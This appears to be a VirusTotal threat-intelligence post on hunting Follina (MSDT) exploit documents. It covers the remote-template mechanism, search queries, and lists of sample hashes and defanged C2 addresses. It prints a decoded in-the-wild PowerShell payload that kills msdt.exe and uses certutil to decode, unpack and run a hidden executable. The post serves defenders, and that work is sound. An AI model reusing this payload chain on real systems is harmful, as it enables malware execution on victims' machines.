According to their announcement, this vulnerability was found in (at the time) recently uploaded sample to VirusTotal\nfrom Belarus, which suggested it was actively being exploited.\n\nThis vulnerability in Microsoft Support Diagnostic Tool (MSDT) can enable remote code execution (RCE) when MSDT is invoked\nusing the URL protocol from a calling application, such as Microsoft Word. This, combined with the remote template feature in\nMicrosoft Word, allows an attacker to link a document with a template containing arbitrary code to execute. This vulnerability\nattracted a lot of attention within the security industry, with several Follina active attacks detected shortly after details were available.\n\nThis post provides a high level overview of all observed attacks with a focus on the ones that took place before the 0-day was\npublicly disclosed, and practical recommendations on how to monitor and hunt Follina samples with VirusTotal.\n\n## Initial case walkthrough\n\n[The initially reported sample was this malformed Microsoft Word document. From either the](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection) [Relations or](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/relations) [Behaviour tabs it is possible](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/behavior)\nto spot the request for the remote template:\n\nBeing docx files basically ZIP files, we can try to find the specific file inside the docx that made the request in the “Bundled Files”\n[section within the Relations tab. Here “word/_rels/document.xml.rels” looks specially interesting, detected as suspicious by a high](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/relations)\nnumber of AVs. The [Content tab for this XML file shows the URL to the remote template, among others.](https://www.virustotal.com/gui/file/62f262d180a5a48f89be19369a8425bec596bc6a02ed23100424930791ae3df0/content/strings)\n\n[We want to check if other files were also using this malicious template. For this, we can navigate to the URL entity and explore inside](https://www.virustotal.com/gui/url/92696af42861199a51a8c2b2f7f6b1e06234a867229ec698c781026401f45962)\n[Relations/Communicating or Relations/Referrer files. We can also check if anything else was downloaded from this suspicious URL](https://www.virustotal.com/gui/url/92696af42861199a51a8c2b2f7f6b1e06234a867229ec698c781026401f45962/relations)\nunder [Relations/Downloaded files or, alternatively, using Details/Body SHA-256 (which should work well for URLs returning a single](https://www.virustotal.com/gui/url/92696af42861199a51a8c2b2f7f6b1e06234a867229ec698c781026401f45962/relations)\nfile). The downloaded file is the remote template fetched by the malicious document we are analyzing.\n\nThe remote template [content shows what appears to be a Base64-encoded payload. After decoding, we get the malicious](https://www.virustotal.com/gui/file/8e986c906d0c6213f80d0224833913fa14bc4c15c047766a62f6329bfc0639bd/content/preview)\nPowershell script executed by the sample:\n\n$cmd = \"c:\\windows\\system32\\cmd.exe\";Start-Process $cmd -windowstyle hidden -ArgumentList \"/c taskkill /f /im msdt.exe\";StartProcess $cmd -windowstyle hidden -ArgumentList \"/c cd C:\\users\\public\\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i\n1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe\";\n\n## Hunting for more samples\n\n**First stage ITW documents**\n\nDuring this stage a lot of the effort will be on filtering out false positives, including PoCs from researchers. To find a starting set of\n[samples, a first approach could be pivoting on crowdsourced Yara rules detecting this exploit:](https://www.virustotal.com/gui/search/crowdsourced_yara_rule%253A000e7c738e%257CSUSP_Doc_WordXMLRels_May22/files)\n\n\n-----\n\nTo find interesting samples, an idea could be using the first submission (fs) modifier to retrieve samples uploaded to VirusTotal\n**before the vulnerability was published:**\n\n[crowdsourced_yara_rule:000e7c738e|SUSP_Doc_WordXMLRels_May22 fs:2022-05-27-](https://www.virustotal.com/gui/search/crowdsourced_yara_rule%253A000e7c738e%257CSUSP_Doc_WordXMLRels_May22%2520fs%253A2022-05-27-)\n\nAn alternative way to find a set of samples could be using VT Grep capabilities to search for specific Follina-content in bundled XML\nfiles:\n\n[content:\"TargetMode=\\\"External\\\"\" AND ( content:\".htm!\" OR content:\".html!\")](https://www.virustotal.com/gui/search/content%253A%2522TargetMode%253D%255C%2522External%255C%2522%2522%2520(%2520content%253A%2522.htm!%2522%2520OR%2520content%253A%2522.html!%2522)/files)\n\n[Please note VT Grep has some limitations in the number of additional modifiers it can be used with.](https://support.virustotal.com/hc/en-us/articles/360001386897-Content-search-VTGrep-)\n\nAn interesting pivoting point are document properties (such as author) to get all the files created or edited by a certain person. Lots of\nPoCs developers use publicly disclosed documents to simply modify the address hosting the malicious remote template. For\ninstance, the following VTI query provides a nice starting point:\n\n[metadata:KIS2 type:docx](https://www.virustotal.com/gui/search/metadata%253AKIS2%2520type%253Adocx/files)\n\nWe can add extra filters to the previous searches to exclude obvious PoCs, such certain file names or adding a file type filter to\nexclude bundled XML files. The example below uses a crowdsourced YARA rule as starting set of results and uses some of these\nfilter ideas:\n\ncrowdsourced_yara_rule:000e7c738e|SUSP_Doc_WordXMLRels_May22 type:docx AND NOT ( name:follina OR name:diagnostic\nOR name:cve OR name:test OR name:clickme OR name:msf OR name:poc.doc OR name:exploit OR name:layoffs )\n\n**Remote templates**\n\nSearching for remote templates used by Follina samples has the advantage that we don’t need to rely on the format (docx, RTF, etc)\nof the first stage document. It can also be useful to discover additional documents using the same template.\n\n[The analyzed remote template gives us ideas on what could be a right combination of file properties to search for. Interestingly, in this](https://www.virustotal.com/gui/file/8e986c906d0c6213f80d0224833913fa14bc4c15c047766a62f6329bfc0639bd/details)\ncase the combined output of two different tools (File type identification and file’s Magic bytes) provides a first approach:\n\n\n-----\n\nThe following query will retrieve HTML documents containing Powershell scripts, which is interesting nevertheless:\n\n[tag:powershell magic:\"HTML document text\"](https://www.virustotal.com/gui/search/tag%253Apowershell%2520magic%253A%2522HTML%2520document%2520text%2522/files)\n\nThis query does not rely on AV’s verdicts, thus not risking to miss something undetectable, however provides false positives (not\nfollina-related samples). Additionally, not all Follina remote templates get indexed as HTML documents. Another approach could use\nVT Grep for Powershell scripts including a call to MSDT:\n\n[tag:powershell content:\"ms-msdt:\"](https://www.virustotal.com/gui/search/tag%253Apowershell%2520content%253A%2522ms-msdt%253A%2522/files)\n\nAnother variant of this idea omits the Powershell tag and relies only on file content. The size keyword is used as an additional filter\nbased on the size of the discovered remote templates:\n\n[content:\"location.href\" content:\"ms-msdt:\" size:100kb-](https://www.virustotal.com/gui/search/content%253A%2522location.href%2522%2520content%253A%2522ms-msdt%253A%2522%2520size%253A100kb-/files)\n\n[This last approach is quite similar to a classic YARA hunting which we could use in Livehunt and](https://www.virustotal.com/gui/hunting/rulesets) [Retrohunt services. Examples of](https://www.virustotal.com/gui/hunting/retrohunt)\ngeneric YARA rules are provided at the end of this post.\n\n## Our findings\n\n[Even though most of the samples available in VirusTotal were already covered by security vendors (like Malwarebytes,](https://blog.malwarebytes.com/threat-intelligence/2022/06/russias-apt28-uses-fear-of-nuclear-war-to-spread-follina-docs-in-ukraine/) [Proofpoint](https://twitter.com/threatinsight/status/1531688214993555457)\netc), we wanted to summarize them all together along with our own findings.\n\nWe started by getting all documents containing references to remote Html templates ending with exclamation marks (“html!” or\n“htm!”) and then we divided them into two groups: submitted before and submitted after the public vulnerability disclosure.\n\n**Before the disclosure**\n\nWe only found 10 samples submitted to VirusTotal before May 28th. At least a few of them (below) look like PoCs created before the\npublic disclosure and the first observed in-the-wild attack, which is interesting:\n\n\n**SHA-1** **Remote template** **Submitter’s**\n**country**\n\n\n**First**\n**submission**\n**date**\n\n\n[5757f8027668fc5bdc979df484cabb4c94b5fa3c](https://www.virustotal.com/gui/file/e1f1959f6c47aec8f89490b1839a72d098ecf148470c986ab9d7e95bd17e806a) hxxps://127.0.0[.]1/testtesttest.html Brazil 2021-10-21\n\n[22fa626a3a1eb509a1a14b616d4ec094eb2b8f9a](https://www.virustotal.com/gui/file/39c15fecc73df9e62e0ffea3ead28b316917886ca06a099a7d825f8495c97e2e) hxxp://127.0.0[.]1/testtesttest.html Argentina 2021-10-21\n\n\n-----\n\n[f022d03cc10b64b2566c3bb048a2fb61486db75c](https://www.virustotal.com/gui/file/cd9d8d7a5e62bfc7222731efa090957ceb43e2f6f5083bb7d4cc8088c1cb0608) hxxp://asdasdas[.]com/e8c76295a5f9acb7/side.html Hong Kong 2021-09-09\n\n[b0c4eff759136fef0e67291ea57b78546b8a94a3](https://www.virustotal.com/gui/file/0bd10e9946e031ec211cc30614a160b767cc9cec91a339987afcbb4e0c33c6b7) hxxp://caribarena[.]com/e8c76295a5f9acb7/side.html Hong Kong 2021-09-09\n\nFollina exploit implementations share similarities with CVE-2021-40444 (RCE in Microsoft MSHTML), using a similar approach to\nfetch a remote template from an XML Relationship file. Follina’s payloads are located in the remote template, making it necessary to\nanalyze the remote payload for ful visibility of the attack.\n\nA second set of samples seems to have been (most likely) used in real attacks. The following six documents use four different C2\naddresses:\n\n[B22db9ccd50064cbaf5876a4a318ec8eea284585](https://www.virustotal.com/gui/file/4f11f567634b81171a871c804b35c672646a0839485eca0785db71647a1807df)\n\n[F5978deec22543a301e7ff4e01db950d8f474a4c](https://www.virustotal.com/gui/file/d61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7/details)\n\n[934561173aba69ff4f7b118181f6c8f467b0695d](https://www.virustotal.com/gui/file/710370f6142d945e142890eb427a368bfc6c5fe13a963f952fb884c38ef06bfa/details)\n\n[447139a8cfc9660215bef2230e25885f553ddba8](https://www.virustotal.com/gui/file/fe300467c2714f4962d814a34f8ee631a51e8255b9c07106d44c6a1f1eda7a45/details)\n\n[818803f1bd2d2ac66b2e36ccd9971ba85b8901f0](https://www.virustotal.com/gui/file/d118f2c99400e773b8cfd3e08a5bcf6ecaa6a644cb58ef8fd5b8aa6c29af4cf1/detection)\n\n[06727ffda60359236a8029e0b3e8a0fd11c23313](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection)\n\nAnd the following are two of the remote templates used by some of the previous samples:\n\n[0fe3d3394aa14c8eb8228bf7d3fb4169342d4c5e](https://www.virustotal.com/gui/file/3bf2bed980adca2fb8035c308241659346a37d70d53ed549d1dfd5a8e03a2c64/content)\n\n[b11edf05b9f5bef2c98a46af5c8646fbf74e4a9f](https://www.virustotal.com/gui/file/8e986c906d0c6213f80d0224833913fa14bc4c15c047766a62f6329bfc0639bd/content/preview)\n\nSome evidence, including pdns history and public email addresses, seem to indicate that one of the domains hosting a payload might\nbe a compromised legitimate server. A second sample (in the “After the disclosure” set described below) also seems to abuse a\ncompromised domain.\n\n**After the disclosure**\n\nTo exclude PoCs from actual attacks, we filtered out samples using obvious names (like “follina.doc”, “poc.docx”, “test”, etc) as well\nas samples using local, non-existing C2 addresses or previously known C2 addresses (to avoid slightly modified resubmissions).\n\n[We found a set of samples reusing a single initially disclosed blank document and replacing the C2 with their own:](https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection)\n\n\n**SHA-1** **Remote template** **Submitter’s**\n**country**\n\n\n**First**\n**submission**\n**date**\n\n\n[8f3b9afebbccb964c052c03179d6b493a7a658d1](https://www.virustotal.com/gui/file/c67ad1e4676506f59f6ac3e2de3ba5fa73c97b817848a320789695a141a88374/details) http://93.115.26[.]76:8000/index.html Pakistan 2022-06-02\n\n[158e29cc9db5b056db2876b8f49f85f34c2692ec](https://www.virustotal.com/gui/file/b8d9aae4a69ea687618e9f070791553b076032fb425a519970b7ba398a73233e/details) http://68.183.36[.]18:8000/index.html Ethiopia 2022-06-01\n\n\n[e49fff723fb097d098d0570be58f94f0cf41e70a](https://www.virustotal.com/gui/file/5d76896dcd50526c71d93085d1f88bb61fd86c1e51630bfcd2d0fa287751adaf/details) https://708b-27-122-1441.ap.ngrok[.]io/index.html\n\n\nVietnam 2022-05-31\n\n\n[959a41f799fda0e645e52eef450c5ef45ad67d65](https://www.virustotal.com/gui/file/3db60df73a92b8b15d7885bdcc1cbcf9c740ce29c654375a5c1ce8c2b31488a1/details) https://www.cssformats[.]com/o/SDS84Sl.html Germany 2022-05-30\n\nIn some cases, attackers implemented their own malformed document with specific spear phishing content.\n\nThis [document document mimics an invitation to Doha Expo in Qatar and requests a remote template hosted at files[.]attend-doha-](https://www.virustotal.com/gui/file/6b06af3d20fd4f35fe62151d45e4344314d26b68d886d80ad6d8a375820247cf/content/preview)\nexpo[.]com.

Like in the previous case, it was available for a really short period of time.\n\n## Conclusions\n\nUsed to weaponize first-stage documents to set a foot in the victim, Follina is an example of a vulnerability well worth monitoring. The\nretrospective analysis provides insights on for how long this vulnerability has been abused before being identified. Continuous\nmonitoring helps identify additional indicators and avoid attacks against our organization, but most importantly, learn how attacks\nevolve and what kind of malware they are using. Threat intelligence should be actionable.\n\nWe provided several ideas on how you can use VirusTotal to hunt for new samples to discover new variations of this attack, which\ncould be reused for any other campaign you would like to monitor in your Threat Hunter journey.
